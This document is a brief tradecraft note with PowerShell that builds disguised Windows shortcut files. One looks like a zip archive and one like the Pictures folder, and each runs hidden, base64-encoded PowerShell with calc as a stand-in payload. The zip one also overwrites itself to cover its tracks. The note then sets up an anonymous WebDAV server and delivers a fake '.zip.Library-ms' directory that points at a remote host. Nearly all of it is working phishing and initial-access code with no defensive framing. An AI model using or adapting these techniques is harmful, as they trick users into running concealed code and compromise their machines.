# generating special lnk 

- a zip file
```powershell
$command = '$lnkPath = -join($(pwd),"\files.zip.lnk"); $txtPath = $lnkPath.replace(".zip.lnk", ".txt"); move $lnkPath $txtPath; Clear-Content $txtPath; Add-Content $txtPath "opa"; powershell -c "calc"'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

$obj = New-object -comobject wscript.shell
$link = $obj.createshortcut("c:\users\box\Desktop\files.zip.lnk")
$link.windowstyle = "7"
$link.targetpath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$link.iconlocation = "%systemroot%\system32\imageres.dll,165"
$link.arguments = "-Nop -sta -noni -w hidden -encodedCommand $encodedCommand"
$link.save()
```

- Pictures folder
```powershell
$command = 'explorer $([Environment]::GetFolderPath("MyPictures")); powershell -c "calc"'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

$obj = New-object -comobject wscript.shell
$link = $obj.createshortcut("c:\users\box\Desktop\Pictures.lnk")
$link.windowstyle = "7"
$link.targetpath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$link.iconlocation = "%systemroot%\system32\imageres.dll,67"
$link.arguments = "-Nop -sta -noni -w hidden -encodedCommand $encodedCommand"
$link.save()
```

# generating Library (fake directory)
- run server `wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ~/share`

- delivery a file with the extension `.zip.Library-ms` and the following content:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,165</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>true</isSupported>
<simpleLocation>
<url>http://1.2.3.4</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```